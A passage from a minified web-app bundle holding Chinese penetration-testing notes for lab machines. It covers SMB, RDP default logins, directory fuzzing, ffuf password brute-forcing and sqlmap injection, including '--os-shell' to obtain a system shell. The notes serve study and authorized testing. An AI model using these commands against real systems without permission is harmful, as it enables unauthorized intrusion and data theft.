                  \u7B2C\u4E8C\u79CD\uFF0C\u6307\u5B9A\u7528\u6237\u540D\u767B\u5F55
                      \u300A-U\u300B\uFF0C\u6307\u5B9A  \u767B\u5F55\u7528\u6237\u540D


          \u63D0\u793A\u8F93\u5165\u5BC6\u7801\uFF1A
              \u53EF\u4EE5\u5C1D\u8BD5\uFF0C\u76F4\u63A5\u3010\u56DE\u8F66\u3011\uFF0C\u5373\u65E0\u5BC6\u7801
              \u6216\u8005\u7528\u3010-N\u3011\u9009\u9879\u6307\u5B9A

          \u6BD4\u8F83\u5C11\u7528\u7684\u9009\u9879\uFF1A
              \u3010-N\u3011\uFF0C\u6307\u6CA1\u6709\u5BC6\u7801

          \u5E38\u89C1\u547D\u4EE4\uFF08\u767B\u5F55\u540E\uFF09

              \u57FA\u672C\u540C\u4E8E\u3010ftp\u3011\u3002

              allinfo   \u67E5\u770B\u6587\u4EF6\u5C5E\u6027
                `,Object(u.d)({\u667A\u80FD\u6B65\u9AA4_cfg:ne.FTP_\u624B\u518C}),`

          \u53EF\u80FD\u7684\u4E00\u4E9B\u95EE\u9898\uFF1B
              \u62A5\u9519\u3010protocol negotiation failed: NT_STATUS_CONNECTION_DISCONNECTED\u3011
                  \u8D44\u6599\uFF1Ahttps://www.reddit.com/r/oscp/comments/fg956k/comment/fk41pgg/?utm_source=share&utm_medium=web2x&context=3
                  \u89E3\u51B3\u65B9\u6848\uFF1B
                      \u7B2C\u4E00\u79CD\uFF0C\u6DFB\u52A0\u3010client min protocol\u3011\u914D\u7F6E\u5373\u53EF
                      \u7B2C\u4E8C\u79CD\uFF0C\u5728\u547D\u4EE4\u884C\u4E2D\uFF0C\u6DFB\u52A0\u3010--option='client min protocol=NT1'\u3011\u3002
              \u62A5\u9519\u3010tree connect failed: NT_STATUS_ACCESS_DENIED\u3011
              \u62A5\u9519\u3010Error opening local file \u3011

                `))})},{name:"\u3010smbmount\u3011        \uFF08Linux\u5DE5\u5177\uFF09",desc:e.a.createElement(e.a.Fragment,null),content:e.a.createElement(e.a.Fragment,null,F.a.\u8F6C\u5316\u8001\u6587\u672C_\u4E3Apre\u6807\u7B7E())},{name:"\u3010smbmap\u3011 / \u3010smbmap.py\u3011          \uFF08Linux\u5DE5\u5177\uFF09",desc:e.a.createElement(e.a.Fragment,null),content:e.a.createElement(e.a.Fragment,null,F.a.\u8F6C\u5316\u8001\u6587\u672C_\u4E3Apre\u6807\u7B7E(`

          \u547D\u4EE4\uFF1A
              smbmap  -H  <IP\u5730\u5740>  --no-banner
                  \u3010-H\u3011\uFF0C\u6307\u5B9A\u5730\u5740

              smbmap  -H  <IP\u5730\u5740>  -R  <\u5BF9\u5E94Share>  --no-banner
                  \u3010-R\u3011\uFF0C\u9012\u5F52\u7684\u5217\u51FA\u76EE\u5F55

          \u5E38\u89C1\u9009\u9879
              \u3010--download  <\u5F85\u4E0B\u8F7D\u6587\u4EF6\u8DEF\u5F84>\u3011

              \u3010-A  <\u901A\u914D\u7B26>\u3011\uFF0C\u4E0B\u8F7D\u5339\u914D\u7684\u5168\u90E8
                  \u66FF\u4EE3\u3010--download\u3011\u4F7F\u7528\u3002\u4E0B\u8F7D\u6240\u6709  \u6EE1\u8DB3\u901A\u914D\u7B26  \u7684\u6587\u4EF6\u3002
                  \u6BD4\u5982\uFF1A
                      \u3010-A  *\u3011\u3001\u3010-A  xml\u3011
          `))}]},M=C,L=g.l.singleATag_blank,J={name:"\u3010RDP\u3011_\u624B\u518C",steps:[{name:"\u57FA\u672C\u4ECB\u7ECD",desc:e.a.createElement(e.a.Fragment,null),content:e.a.createElement(e.a.Fragment,null,F.a.\u8F6C\u5316\u8001\u6587\u672C_\u4E3Apre\u6807\u7B7E(`
          \u8FDC\u7A0B\u684C\u9762\u534F\u8BAE
              Remote Desktop Protocol

          \u8001\u7248\u7684\u8FDC\u7A0B\u8BBF\u95EE\u5DE5\u5177\uFF0C\uFF08\u9ED8\u8BA4\u9009\u62E9\uFF09 telnet

          \u4F7F\u7528\u547D\u4EE4\u884C\u7EC8\u7AEF\uFF0C\u8FDB\u884C\u6295\u5F71
              rdesktop
              xfreerdp

          ms-wbt-server
              Windows Based Terminals

          Microsoft Terminal Services

          `))},{name:"\u8D26\u53F7\u5BC6\u7801",desc:e.a.createElement(e.a.Fragment,null),content:e.a.createElement(e.a.Fragment,null,F.a.\u8F6C\u5316\u8001\u6587\u672C_\u4E3Apre\u6807\u7B7E(`
      \u4E0D\u6307\u5B9A\u8D26\u53F7\uFF0C\u4F7F\u7528\u300ADomain\u300B\u767B\u5F55
          \u53EF\u80FD\u5DF2\u7ECF\u5728\u300Anmap\u300B\u73AF\u8282\uFF0C\u626B\u63CF\u51FA\u6765\u4E86\u3002
              \u5728\u3010Domain\u3011\u76F8\u5173\u5B57\u6BB5\uFF0C\u5C31\u53EF\u4EE5\u770B\u51FA\u6765\uFF01\uFF01\uFF01
          \u4E5F\u53EF\u80FD\u5728\u3010xfreerdp\u3011\u63D0\u793A\u8F93\u5165\u7684\u4E0A\u4E00\u884C\uFF0C\u6709\u4E00\u4E2A\u300A\u8F93\u51FA\u65E5\u5FD7\u300B
              \u4ECE\u3010\u547D\u4EE4\u884C\u7684verbose\u3011\u4FE1\u606F\uFF0C\u5C31\u53EF\u4EE5\u770B\u51FA\u6765\uFF01\uFF01\uFF01

      \u624B\u52A8\u6307\u5B9A\u8D26\u53F7\uFF0C\u4E0D\u4F7F\u7528\u300ADomain\u300B

          \u9ED8\u8BA4\u8D26\u53F7\uFF1A
              Administrator

          \u5176\u5B83\u5E38\u7528\u8D26\u53F7\u540D\uFF1A
              admin \u3001 Administrator \u3001 root \u3001 user


      \u5BC6\u7801\uFF0C\u53EF\u4EE5\u5C1D\u8BD5\u300A\u9ED8\u8BA4\u65E0\u300B
          `))},{name:"\u3010xfreerdp\u3011",desc:e.a.createElement(e.a.Fragment,null),content:e.a.createElement(e.a.Fragment,null,F.a.\u8F6C\u5316\u8001\u6587\u672C_\u4E3Apre\u6807\u7B7E(`
      \u53C2\u8003\u8D44\u6599\uFF1Ahttps://miloserdov.org/?p=4516

      \u767B\u5F55
          xfreerdp /v:<IP\u5730\u5740>[:PORT]

          xfreerdp /f /u:<\u7528\u6237\u540D> /p:<\u5BC6\u7801> /v:<IP\u5730\u5740>[:PORT]
              \u300A/f\u300B    \u4EE5\u5168\u5C4F\u6A21\u5F0F\u6253\u5F00\u8FDC\u7A0B\u684C\u9762
                  \u6709\u65F6\u5019\uFF0C\u82E5\u8FD9\u4E2A\u9009\u9879\u65E0\u6CD5\u6B63\u5E38\u5DE5\u4F5C\uFF0C\u53EF\u4EE5\u53BB\u6389\u8BE5\u9009\u9879\u3002
                      \u6BD4\u5982 HTB \u9776\u673A\u3002
              \u300A/u:\u300B   \u6307\u5B9A\u7528\u6237\u540D
                  \u9700\u8981\u6CE8\u610F\uFF0C\u6B64\u5904\u7684\u300A\u57DFDomain\u300B\u548C\u300A\u7528\u6237\u540Dusername\u300B\uFF0C\u901A\u5E38\u662F  \u4E0D\u53EF\u4E92\u6362\u7684\u3002
                      \u5404\u81EA\u6709\u72EC\u7ACB\u7684\u4F5C\u7528\u3002
              \u300APORT\u300B  \u7AEF\u53E3\u53EF\u9009

      \u9000\u51FA\u767B\u5F55
          \u975E\u5168\u5C4F\uFF0C\u76F4\u63A5\u5173\u95ED\u7A97\u53E3

          \u5168\u5C4F\uFF0C\u70B9\u51FB\u3010\u5F00\u59CB\u2014\u2014\u7528\u6237\u2014\u2014\u6CE8\u9500\u3011
          `))}]},q=J,V=n("AkKX"),tu=g.l.singleATag_blank,Y={name:"\u3010Fuzz\u3011_\u3010\u6A21\u7CCA\u6D4B\u8BD5\u3011_\u624B\u518C",steps:[{name:"\u3010wfuzz\u3011",desc:e.a.createElement(e.a.Fragment,null),content:e.a.createElement(e.a.Fragment,null,F.a.\u8F6C\u5316\u8001\u6587\u672C_\u4E3Apre\u6807\u7B7E(`

          \u7528\u4F5C\u3010\u76EE\u5F55\u679A\u4E3E\u3011
              wfuzz  -w  <\u8BCD\u5178\u6587\u4EF6>  -t  64  --hc  404  http://10.10.10.171/FUZZ
                  \u3010-w\u3011
                  \u3010-t\u3011\uFF0C\u7EBF\u7A0B\u6570
                  \u3010--hc  <abc>\u3011
                      \u9690\u85CF\u6307\u5B9A\u3010\u72B6\u6001\u7801\u3011\u7684\u54CD\u5E94
                  \u3010--hl\u3011
                      \u540C\u4E0A\uFF0C\u9690\u85CFlines
                  \u3010--hw\u3011
                      \u540C\u4E0A\uFF0C\u9690\u85CFwords
                  \u3010--hh\u3011
                      \u540C\u4E0A\uFF0C\u9690\u85CFchars

          `))}]},au=Y,hu=g.l.singleATag_blank,mu={name:"\u3010\u76EE\u5F55\u679A\u4E3E\u3011_\u624B\u518C",desc:e.a.createElement(e.a.Fragment,null,V.a.\u4E0D\u4E8C\u6B21\u72AF\u9519_KEY.\u679A\u4E3E_\u539F\u7406_\u751F\u6548\u672C\u8D28),steps:[{name:"\u57FA\u672C\u4ECB\u7ECD",desc:e.a.createElement(e.a.Fragment,null),content:e.a.createElement(e.a.Fragment,null,F.a.\u8F6C\u5316\u8001\u6587\u672C_\u4E3Apre\u6807\u7B7E(`
  directory busting
  Web Enumeration
          `))},{name:"\u3010gobuster\u3011",desc:e.a.createElement(e.a.Fragment,null),content:Promise.all([Promise.resolve().then(n.bind(null,"yEy/"))]).then(function(Xu){var $u=Object(y.a)(Xu,1),ne=$u[0];return e.a.createElement(e.a.Fragment,null,F.a.\u8F6C\u5316\u8001\u6587\u672C_\u4E3Apre\u6807\u7B7E(`
      \u53C2\u8003\u8D44\u6599\uFF1A
          \u300A1.2\u300B\u7248\u672C\uFF1Ahttps://www.kali.org/tools/gobuster/
          \u300A3+\u300B\u7248\u672C\uFF1Ahttps://github.com/OJ/gobuster#dir-mode-options
          \u5B98\u65B9\uFF1Ahttps://github.com/OJ/gobuster

      \u626B\u63CF
          gobuster  dir  -e  -u  <Url\u5730\u5740>  -w  <\u8BCD\u5178\u4F4D\u7F6E>
              \u300A-e\u300B\uFF0C(\u62D3\u5C55\u5F00\u6765)\uFF0C\u6307\uFF0C\u6253\u5370 \u53D1\u73B0\u8DEF\u5F84 \u7684\u300A\u5B8C\u6574\u8DEF\u5F84\u300B\u3002
              \u300A-w\u300B\uFF0C\u6307\u5B9A\u8BCD\u5178\u4F4D\u7F6E

      \u5E38\u7528\u8BCD\u5178
`.concat(ne.\u5E38\u7528\u8BCD\u5178_Helper.HTB_\u63D0\u4F9B\u8BCD\u5178,`

              `),Object(u.d)({\u667A\u80FD\u6B65\u9AA4_cfg:ne.\u8BCD\u5178_\u5BC6\u7801_\u53E3\u4EE4_\u7F16\u7801_\u7206\u7834_\u624B\u518C}),`




      \u5E38\u89C1\u9009\u9879
          \u3010dir\u3011

              \u3010-e\u3011
                  \u89C1\u4E0A

              \u3010-x \u3001 --extensions\u3011
                  \u6587\u4EF6\u62D3\u5C55\u540D

              \u3010-c\u3001 --cookies\u3011
                  \u6307\u5B9A\u3010cookies\u3011\u503C\u3002

              \u3010-t\u3001 --threads\u3011
                  \u6307\u5B9A\u3010\u7EBF\u7A0B\u6570\u3011\u3002(\u9ED8\u8BA410)

              \u3010--wildcard\u3011
                  \u5F53\u9047\u5230\u3010\u901A\u914D\u7B26\u3011\u65F6\uFF0C\u4E5F\u5F3A\u5236\u7EE7\u7EED (\uFF1F\uFF1F\uFF1F\uFF1F\uFF1F\uFF1F)

              \u3010-s\u3001 --status-codes\u3011
                  \u767D\u540D\u5355
                  \u6307\u5B9A\u3010\u76EE\u6807\u72B6\u6001\u7801\u3011\uFF0C\u5982\u3010"200,405"\u3011

                  \u5982\u679C\u8FD8\u662F\u4E0D\u884C\uFF0C\u5219\u53EF\u4EE5\u3010\u53CD\u5411\u8FC7\u6EE4\u3011\uFF1A
                        <\u539F\u547D\u4EE4>  |  grep -i "\\!405"

              \u3010-b\u3001 --status-codes-blacklist\u3011
                  \u9ED1\u540D\u5355
                  \u548C\u3010-s\u3011\uFF0C\u6548\u679C\u6B63\u597D\u76F8\u53CD

              \u3010-o\u3001 --output\u3011
                  \u6307\u5B9A\u62A5\u544A\u7684\u6587\u4EF6\u8DEF\u5F84

              \u3010-k\u3011
                  \uFF1F\uFF1F\uFF1F

            `))})},{name:"\u3010ffuf\u3011",desc:e.a.createElement(e.a.Fragment,null,"HTB\u7ED9\u51FA\u7684\u4E00\u4E2A\u65B0\u6B3E"),content:Promise.all([Promise.resolve().then(n.bind(null,"yEy/"))]).then(function(Xu){var $u=Object(y.a)(Xu,1),ne=$u[0];return e.a.createElement(e.a.Fragment,null,F.a.\u8F6C\u5316\u8001\u6587\u672C_\u4E3Apre\u6807\u7B7E(`

          \u53C2\u8003\u8D44\u6599\uFF1A
              \u5B98\u65B9\uFF1Ahttps://github.com/ffuf/ffuf

          \u4F7F\u7528\uFF1A

              \u76EE\u5F55\u626B\u63CF
                  ffuf  -u  <Url\u5E26\u5360\u4F4D\u7B26>
                      \u3010-u\u3011\uFF0C\u6307\u5B9A\u5730\u5740
                          \u5FC5\u987B\u4F7F\u7528\u3010\u5927\u5199FUZZ\u5360\u4F4D\u7B26\u3011

                  ffuf  -u  <Url\u5E26\u5360\u4F4D\u7B26>  -w  <\u8BCD\u5178\u5730\u5740>  -mc  <\u72B6\u6001\u7801>  -o  <\u8F93\u51FA\u6587\u4EF6\u8DEF\u5F84>
                      \u3010-w\u3011\uFF0C\u6307\u5B9A\u8BCD\u5178
                      \u3010-mc\u3011\uFF0C
                          \u5339\u914D\u72B6\u6001\u7801\uFF0C\u3010Match Code\u3011\u3002
                          \u9ED8\u8BA4\uFF1A\u3010200,204,301,302,307,401,403,405,500\u3011
                          \u6216\u8005\uFF0C\u3010all\u3011\u6307\u4EE3\u6240\u6709\u4E8B\u3002
                      \u3010-o\u3011\uFF0C\u8F93\u51FA\u6587\u4EF6

              \u865A\u62DF\u4E3B\u673A\u626B\u63CF
                  123

              GET\u53C2\u6570Fuzz
                  \u5BF9\u3010key\u3011
                      ffuf -w /path/to/paramnames.txt -u https://target/script.php?FUZZ=test_value -fs 4242

                  \u5BF9\u3010value\u3011
                      ffuf -w /path/to/values.txt -u https://target/script.php?valid_name=FUZZ -fc 401

              POST\u6570\u636EFuzz
                  ffuf -w /path/to/postdata.txt -X POST -d "username=admin\\&password=FUZZ" -u https://target/login.php -fc 401

          \u5E38\u7528\u8BCD\u5178
`.concat(ne.\u5E38\u7528\u8BCD\u5178_Helper.HTB_\u63D0\u4F9B\u8BCD\u5178,`

              `),Object(u.d)({\u667A\u80FD\u6B65\u9AA4_cfg:ne.\u8BCD\u5178_\u5BC6\u7801_\u53E3\u4EE4_\u7F16\u7801_\u7206\u7834_\u624B\u518C}),`

          \u4EA4\u4E92\u6A21\u5F0F
              \u6309\u4E0B\u3010Enter\u56DE\u8F66\u3011
                  \u8FDB\u7A0B\u6682\u505C\uFF0C\u8FDB\u5165 \u7C7B\u4F3Cshell \u7684\u3010\u4EA4\u4E92\u6A21\u5F0F\u3011\u3002

              \u7136\u540E\uFF0C\u8F93\u5165\u3010help\u3011\uFF0C\u67E5\u770B\u5E38\u7528\u4EA4\u4E92\u6307\u4EE4

          \u5E38\u89C1\u9009\u9879
              \u3010-c\u3011\uFF0C
                  \u5F69\u8272\u8F93\u51FA
              \u3010-H\u3011\uFF0C
                  \u8BBE\u7F6E\u3010Header\u3011\u8BF7\u6C42\u5934
              \u3010-fs\u3011\uFF0C
                  \u8FC7\u6EE4\u8FD4\u56DE\u5927\u5C0F\uFF0C\u3010Filter Size\u3011
              \u3010-maxtime\u3011\uFF0C
                  \u4E3A\u3010\u6574\u4E2A\u8FC7\u7A0B\u3011\uFF0C\u8BBE\u7F6E\u3010\u6700\u957F\u6267\u884C\u65F6\u95F4\u3011
              \u3010-maxtime-job\u3011\uFF0C
                  \u4E3A\u3010\u9012\u5F52\u3011\u7684\u3010\u6BCF\u4E2A\u5355\u72EC\u4F5C\u4E1A\u3011\uFF0C\u8BBE\u7F6E\u3010\u6700\u957F\u6267\u884C\u65F6\u95F4\u3011
              \u3010-config\u3011
                  \u6307\u5B9A\u3010\u914D\u7F6E\u6587\u4EF6\u3011

              \u3010-recursion\u3011
                  \u9012\u5F52\u626B\u63CF\uFF0C\u8981\u6C42\u3010url\u3011\u4EE5\u3010\u5927\u5199FUZZ\u5360\u4F4D\u7B26\u3011\u7ED3\u5C3E\u3002
              \u3010-recursion-depth\u3011
                  \u9012\u5F52\u6700\u5927\u6DF1\u5EA6\u3002
              \u3010-recursion-strategy\u3011
                  \u9012\u5F52\u7B56\u7565\u3002

          `))})},{name:"\u3010DirBuster\u3011",desc:e.a.createElement(e.a.Fragment,null),content:e.a.createElement(e.a.Fragment,null,F.a.\u8F6C\u5316\u8001\u6587\u672C_\u4E3Apre\u6807\u7B7E(`
          \u4ECB\u7ECD\uFF1A
              \u4E00\u6B3E\u53EF\u89C6\u5316\u5DE5\u5177\u3002\u4E5F\u6709\u8BF8\u591A\u9009\u9879\u3002
                  `))},{name:"\u3010BurpSuite\u3011 \u7684 Proxy\uFF0C\u3010\u88AB\u52A8\u722C\u866B\u3011",desc:e.a.createElement(e.a.Fragment,null),content:e.a.createElement(e.a.Fragment,null,F.a.\u8F6C\u5316\u8001\u6587\u672C_\u4E3Apre\u6807\u7B7E(`

          \u6709\u65F6\u5019\uFF0C\u867D\u7136\u5E76\u4E0D\u80FD\u3010\u76F4\u63A5\u547D\u4E2D\u76EE\u5F55\u3011\uFF1B\u4F46\u4F1A\u3010\u56E0\u4E3A\u5176\u5B83\u6587\u4EF6\u3011\u63ED\u793A\u51FA\u3010\u5DF2\u5B58\u5728\u76EE\u5F55\u3011

              \u6BD4\u5982\uFF0C\u7531\u3010/cdn-cgi/login/script.js\u3011\u6587\u4EF6\uFF0C\u5F15\u51FA\u3010/cdn-cgi/login/\u3011\u76EE\u5F55
                  \u5E76\u7531\u6B64\uFF0C\u8BBF\u95EE\u3010/cdn-cgi/login/index.php\u3011

          `))},au,{name:"\u3010dirb\u3011",desc:e.a.createElement(e.a.Fragment,null),content:e.a.createElement(e.a.Fragment,null,F.a.\u8F6C\u5316\u8001\u6587\u672C_\u4E3Apre\u6807\u7B7E(`

          dirb
              dirb  <url\u5730\u5740>

          `))}]},Pu=mu,qu=n("s1IG"),Qu=g.l.singleATag_blank,Wu=F.a.\u8F6C\u5316\u8001\u6587\u672C_\u4E3Apre\u6807\u7B7E(`
              \u8FDE\u63A5shell
                  sqlmap  -u  <\u63A5\u53E3url>  --cookie="cookie\u6587\u672C\u5BF9"  --os-shell
                      1.\u76F4\u63A5\u8FDE\u4E0A\u3010\u7CFB\u7EDFshell\u3011\u3002
                      2.\u9700\u8981\u63D0\u4F9B\u3010\u540E\u53F0\u5F00\u53D1\u8BED\u8A00\u3011\u7684\u4FE1\u606F
                          1. asp\u3001aspx\u3001jsp\u3001php\uFF0C\u7B49\u7B49
              `),U={name:"\u3010SQL\u3011_\u624B\u518C",steps:[{name:"\u3010mysql\u3011 \u3010\u547D\u4EE4\u884C\u3011",desc:e.a.createElement(e.a.Fragment,null),content:e.a.createElement(e.a.Fragment,null,F.a.\u8F6C\u5316\u8001\u6587\u672C_\u4E3Apre\u6807\u7B7E(`
          \u767B\u5F55
              mysql  -h  <\u4E3B\u673A\u5730\u5740>  -u  <\u7528\u6237\u540D>  \uFF0Dp <\u7528\u6237\u5BC6\u7801>
                  1

              mysql  -h  <\u4E3B\u673A\u5730\u5740>  -u  <\u7528\u6237\u540D>  \uFF0Dp <\u7528\u6237\u5BC6\u7801>  -P  <\u7AEF\u53E3>
                  \u300A-P\u300B\uFF0C\u6307\u5B9A\u7AEF\u53E3

          \u8D26\u53F7\u5BC6\u7801
              \u300Aroot\u300B\u8D26\u6237\uFF0C\u65E0\u9700\u5BC6\u7801


          \u8FDB\u5165\u4E4B\u540E\uFF0C\u5E38\u89C1\u547D\u4EE4
              \u67E5\u770B\u6570\u636E\u5E93
                  show databases;

              \u9009\u7528\u4E00\u4E2A\u6570\u636E
                  use <\u6570\u636E\u5E93\u540D\u79F0>;

              \u67E5\u770B\u6570\u636E\u8868
                  show tables;

              \u67E5\u770B\u8868\u7ED3\u6784
                  describe <\u8868\u540D\u79F0>;

          `))},{name:"\u3010sqlmap\u3011",desc:e.a.createElement(e.a.Fragment,null),steps:[{name:"\u642D\u5EFA",desc:e.a.createElement(e.a.Fragment,null),content:e.a.createElement(e.a.Fragment,null,F.a.\u8F6C\u5316\u8001\u6587\u672C_\u4E3Apre\u6807\u7B7E("		1.\u3010sqlmap --update\u3011\uFF0C\u5347\u7EA7\u3002"))},{name:"\u57FA\u672C\u4F7F\u7528",desc:e.a.createElement(e.a.Fragment,null),content:e.a.createElement(e.a.Fragment,null,F.a.\u8F6C\u5316\u8001\u6587\u672C_\u4E3Apre\u6807\u7B7E(`

              \u3010sqlmap\u3011\u547D\u4EE4\uFF0C\u53EF\u4EE5\u7528\u3010python3  /usr/bin/sqlmap\u3011\u66FF\u4EE3

              GET\u53C2\u6570

                  sqlmap  -u  <\u63A5\u53E3url>
`,`
              POST\u53C2\u6570
                `,e.a.createElement(e.a.Fragment,null,"\uFF08",Qu("\u8D44\u65991","https://blog.csdn.net/u011781521/article/details/58594941"),"\uFF09"),`
                  1.\u5148\u5C06\u3010\u8BF7\u6C42\u3011\u4FDD\u5B58\u4E3A\u3010HTTP\u62A5\u6587\u6587\u4EF6\u3011\uFF0C\u518D\u7528\u3010-r\u3011\u9009\u9879 \u52A0\u8F7D\u6587\u4EF6 \uFF0C\u5373\u53EF\u3002
                      1.\u89C1\u3010\u5E38\u89C1\u9009\u9879\u3011\u2014\u2014\u3010 -r\u9009\u9879 \u3011\u3002

                  2.\u793A\u4F8B\uFF1A
                      sqlmap  -r  sql-data.txt
                `,`

              Cookie\u53C2\u6570
                  \u8D44\u6599\uFF1A
                      https://superuser.com/a/1167937/1115713

                  sqlmap  -u  <\u63A5\u53E3url>  --cookie="cookie\u6587\u672C\u5BF9"  --level  2
                      1.\u8981\u6C42\u3010--level\u3011>=2

              \u4E4B\u540E\u4F1A\u8BE2\u95EE\u7684\u4E00\u4E9B\u95EE\u9898\uFF1A
                  1.\u53D1\u73B0\u662F xxx \u6570\u636E\u5E93\u8F6F\u4EF6\uFF0C\u662F\u5426\u8DF3\u8FC7 \u5176\u5B83\u6570\u636E\u5E93\u8F6F\u4EF6 \u7684\u5C1D\u8BD5\uFF1F
                  2.\u5BF9\u4E8E\u63A5\u4E0B\u6765\u7684\u5C1D\u8BD5\uFF0C\u662F\u5426\u5305\u62EC\u3010\u6240\u6709\u5C1D\u8BD5\u3011\uFF1F  \uFF08\u6839\u636E\u73B0\u6709\u7EA7\u522B\u548C\u98CE\u9669\uFF09
                  3.\u67D0\u4E2A \u53C2\u6570 \u53D1\u73B0\u98CE\u9669\uFF0C\u662F\u5426\u8FD8 \u7EE7\u7EED\u5C1D\u8BD5 \u5176\u5B83\u53C2\u6570\uFF1F

              \u6700\u540E\uFF0C\u4F1A\u5217\u51FA\u5404\u4E2A\u3010\u6CE8\u5165\u70B9\u3011\u6765\uFF1A
                  1.\u4F1A\u4FDD\u5B58\u5728\u3010.sqlmap/output/\u5730\u5740/log\u3011\u91CC\u9762\u3002
                  2.\u8981\u7D20\uFF1A
                      1.\u3010Type\u3011\uFF0C\u57FA\u672C\u7C7B\u578B
                      2.\u3010Title\u3011\uFF0C\u6CE8\u5165\u70B9\u7684\u5177\u4F53\u6807\u9898
                      3.\u3010Payload\u3011\uFF0C\u5177\u4F53\u653B\u51FB\u8D1F\u8F7D\uFF08\u4EE3\u7801\uFF09

              `))},{name:"\u5DE5\u5177\u8FDE\u63A5Shell",desc:e.a.createElement(e.a.Fragment,null),content:e.a.createElement(e.a.Fragment,null,Wu)},{name:"\u300A\u81EA\u52A8\u641C\u7D22\u300B\u8868\u5355\uFF0C\u8FDB\u884C\u6CE8\u5165",desc:e.a.createElement(e.a.Fragment,null),content:e.a.createElement(e.a.Fragment,null,F.a.\u8F6C\u5316\u8001\u6587\u672C_\u4E3Apre\u6807\u7B7E("	\u3010\u81EA\u52A8\u641C\u7D22\u3011\u8868\u5355\uFF0C\u8FDB\u884C\u6CE8\u5165\uFF1A","		1.\u3010sqlmap  -u  <url\u5730\u5740>  --forms\u3011"," "))},{name:"\u5E38\u89C1\u9009\u9879",desc:e.a.createElement(e.a.Fragment,null),content:e.a.createElement(e.a.Fragment,null,F.a.\u8F6C\u5316\u8001\u6587\u672C_\u4E3Apre\u6807\u7B7E(e.a.createElement(e.a.Fragment,null,"	","\u5E38\u89C1\u9009\u9879\uFF1A \uFF08",Qu("\u8D44\u65991","https://zhuanlan.zhihu.com/p/148043191"),"\u3001",Qu("\u5B98\u65B9\u9009\u9879\u6587\u68631","https://github.com/sqlmapproject/sqlmap/wiki/Usage"),"\uFF09"),`

                4.\u3010-p\u3011\uFF0C\u6307\u5B9A\u9700\u8981\u6D4B\u8BD5\u7684\u63A5\u53E3\u53C2\u6570\u540D\u3002 \uFF08\u5982\u679C\u4E0D\u8BBE\u7F6E\uFF0C\u9ED8\u8BA4\u662F\u6240\u6709\u3002\uFF09
                    1.\u53EF\u591A\u4E2A\uFF0C\u7528\u9017\u53F7\u5206\u9694
                    2.\u3010-p 'arg_1,arg_2' \u3011

                5.\u3010--param-filter\u3011
                    \u8FC7\u6EE4

                5.\u3010-dbs\u3011\uFF0C\u5F53\u53D1\u73B0\uFF0C\u6709\u6743\u9650\u8BFB\u53D6\u6570\u636E\u5E93\u7684\u8868\u65F6\uFF0C\u5C1D\u8BD5\u5217\u51FA\u6240\u6709\u7684\u3010\u8868\u3011\u3002
                    1.\u56FD\u5185\u6D4B\u8BD5\uFF0C\u4F1A\u6709\u70B9\u5371\u9669

                6.\u3010-v\u3011\uFF0C\u8BBE\u7F6E\u65E5\u5FD7\u7B49\u7EA7(0-6)\uFF0C\u8D8A\u9AD8\u8D8A\u8BE6\u7EC6\u3002\u9ED8\u8BA4\u4E3A 1 \u3002
                    1.\u4E2A\u522B\u60C5\u51B5\u4E0B\uFF0C\u9700\u8981\u63D0\u9AD8\u7B49\u7EA7\uFF0C\u67E5\u770B\u62A5\u9519\u4FE1\u606F\u3002

                7.\u3010--level\u3011\uFF0C\u8C03\u6574 payload \u7684\u4E30\u5BCC\u6027(1-5)\uFF0C\u8D8A\u9AD8\u8D8A\u4E30\u5BCC\u3002\u9ED8\u8BA4\u4E3A 1 \u3002
                    1.\u5B58\u5728\u4E00\u5B9A\u98CE\u9669
                    2.\u6D4B\u8BD5\u3010Cookie\u3011\u8981\u6C42\u3010level\u3011>=2 \u3002

                8.\u3010--rsk\u3011\uFF0C\u8C03\u6574 \u6CE8\u5165 \u7684\u5192\u9669\u7B49\u7EA7(1-3)\uFF0C\u8D8A\u9AD8\u5C1D\u8BD5\u7684\u53EF\u80FD\u6027\u8D8A\u591A\u3002\u9ED8\u8BA4\u4E3A 1 \u3002
                    1.\u5B58\u5728\u4E00\u5B9A\u98CE\u9669


                3.\u3010-r\u3011\uFF0C\u8BFB\u53D6\u52A0\u8F7D\u3010\u4E00\u4E2A\u6587\u4EF6\u3011\uFF0C\u4F5C\u4E3A\u6D4B\u8BD5\u7684\u63A5\u53E3\u6570\u636E

                    1. \u52A0\u8F7D\u7684\u6587\u4EF6\uFF0C\u662F\u4E00\u4E2A\u3010\u5B8C\u6574HTTP\u62A5\u6587\u3011\u6587\u4EF6\u3002
                    2. \u4FDD\u5B58\u65B9\u5F0F\uFF1A
                        1. BurpSuite
                            1. \u914D\u5408 BurpSuite \u7684\u3010Raw\u2014\u2014Copy to file\u3011\u4F7F\u7528\uFF0C\u53EF\u4EE5\u6781\u5927\u52A0\u901F\u3002
                        2. \u6D4F\u89C8\u5668\u624B\u52A8\u64CD\u4F5C
                            1. \u5148\u590D\u5236\u3010Request Header\u3011
                            2. \u518D\u590D\u5236\u3010Raw Post Data\u3011
                    3. \u5FC5\u987B\u8981\u6CE8\u610F\u3010\u8BF7\u6C42Method\u6570\u636E\u7C7B\u578B\u3011
                        1.\u3010GET\u3011
                            \u3010query\u53C2\u6570\u3011
                            \u3010path\u8DEF\u5F84\u3011
                        2.\u3010POST\u3011\uFF0C
                            \u3010form-data\u3011\u5F62\u5F0F
                                1.\u3010boundary-------\u865A\u7EBF\u6570\u5B57\u3011\u5206\u9694\u5F00\u7684\u3002
                            \u3010raw / json\u3011\u5F62\u5F0F
                                1.\u3010application/json\u3011\u5F62\u5F0F\u7684JSON
                                2.\u3010application/x-www-form-urlencoded\u3011\u5F62\u5F0F\u7684JSON
                                3.\u3010application/json\u3011\u5F62\u5F0F\u7684urlencoded\u8FDE\u5B57\u4E32
                                4.\u3010application/x-www-form-urlencoded\u3011\u5F62\u5F0F\u7684urlencoded\u8FDE\u5B57\u4E32
                            \u3010binary\u3011\u5F62\u5F0F
                        3.\u3010Cookie\u3011\u6570\u636E
                        4.\u3010Headers\u3011\u6570\u636E



                1.\u3010--cookie\u3011 \u5982\u679C\u63A5\u53E3\u4F7F\u7528\u4E86cookie\uFF0C\u5219\u4F20\u5165\u8FD9\u4E2A


                2.\u3010--os-shell\u3011\uFF0C\u5C1D\u8BD5\u8FDE\u63A5 \u7CFB\u7EDFshell

